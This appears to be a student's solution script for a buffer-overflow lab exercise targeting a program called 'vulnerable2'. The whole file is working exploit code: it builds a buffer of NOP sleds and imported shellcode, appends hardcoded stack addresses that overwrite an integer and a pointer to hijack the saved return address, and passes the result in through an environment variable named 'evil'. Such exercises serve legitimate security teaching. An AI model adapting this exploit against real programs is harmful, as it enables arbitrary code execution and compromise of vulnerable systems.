import os
import struct
from shellcode import *
# ./vulnerable2 $(python sol2.py)

#MID NOP ADR - overwrite int a
intA = struct.pack("<I", 0xbfff75b8)

#RET ADR {frame eip} - overwrite int *p
ptrP = struct.pack("<I", 0xbfff7c3c)

buff = (NOP*1000 + shellcode + NOP*995 + intA + ptrP)
os.environ['evil'] = (buff)
print(os.environ['evil'])


